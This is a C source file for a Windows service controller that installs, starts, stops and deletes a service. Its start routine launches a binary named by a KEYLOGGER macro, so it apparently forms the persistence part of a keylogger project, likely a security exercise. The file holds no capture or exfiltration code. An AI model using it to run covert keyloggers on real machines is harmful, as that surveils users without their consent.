#include "service.h"

// https://social.msdn.microsoft.com/Forums/vstudio/en-US/89a4a707-778f-4e64-96d3-ca4a6c89f709/linking-error-lnk2019?forum=vclanguage
#pragma comment(lib, "advapi32.lib")

int	get_error(char *msg)
{
	DWORD	errorMessageID = GetLastError();
	LPSTR	messageBuffer = NULL;
	size_t	size;
	char	*message;

	if(!errorMessageID)
		return (2);
	size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);
	message = messageBuffer;
	printf("%s %s\n", msg, message);
	LocalFree(messageBuffer);
	return (1);
}

int	install(SC_HANDLE manager)
{
	char		path[MAX_PATH];
	SC_HANDLE	service;

	GetModuleFileName(NULL, path, MAX_PATH);
	service = CreateService(manager, NAME, NAME, SERVICE_ALL_ACCESS,
		SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
		path, NULL, NULL, NULL, NULL, NULL);
	if (!service)
		return (get_error("Error: CreateService: "));
	CloseServiceHandle(service);
	printf("Service <%s> installed successfully\n", NAME);
	return (0);
}

int	start(SC_HANDLE manager)
{
	SC_HANDLE		service;
	char			path[MAX_PATH];

	service = OpenService(manager, NAME, SERVICE_START);
	if (!service)
		return (get_error("Error: OpenService: "));
	GetFullPathName(KEYLOGGER, MAX_PATH, path, NULL);
	if (!StartService(service, 1, (char *[]){ path }))
		return (get_error("Error: StartService: "));
	CloseServiceHandle(service);
	printf("Service <%s> started successfully\n", NAME);
	return (0);
}

int	stop(SC_HANDLE manager)
{
	SC_HANDLE		service;
	SERVICE_STATUS	status;

	service = OpenService(manager, NAME, SERVICE_STOP);
	if (!service)
		return (get_error("Error: OpenService: "));
	if (!ControlService(service, SERVICE_CONTROL_STOP, &status))
		return (get_error("Error: ControlService: "));
	CloseServiceHandle(service);
	printf("Service <%s> stopped successfully\n", NAME);
	return (0);
}

int	delete(SC_HANDLE manager)
{
	SC_HANDLE		service;
	SERVICE_STATUS	status;

	service = OpenService(manager, NAME, SERVICE_ALL_ACCESS);
	if (!service)
		return (get_error("Error: OpenService: "));
	QueryServiceStatus(service, &status);
	if (status.dwCurrentState != SERVICE_STOPPED)
	{
		CloseServiceHandle(service);
		return (printf("Service <%s> running, please stop\n", NAME));
	}
	if (!DeleteService(service))
		return (get_error("Error: DeleteService: "));
	CloseServiceHandle(service);
	printf("Service <%s> deleted successfully\n", NAME);
	return (0);
}

int	main(int argc, char **argv)
{
	int			i;
	int		(*operations[4])(SC_HANDLE) = { install, start, stop, delete };
	char		*str_operations[4] = { "install", "start", "stop", "delete" };
	SC_HANDLE	manager;

	if (argc !=2)
		return (printf("Usage: svc.exe [instsall | start | stop | delete]\n"));
	manager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (!manager)
		return (get_error("Error: OpenSCManager: "));
	i = -1;
	while (++i < 4)
	{
		if (!strcmp(str_operations[i], argv[1]))
			operations[i](manager);
	}
	CloseServiceHandle(manager);
	return (0);
}
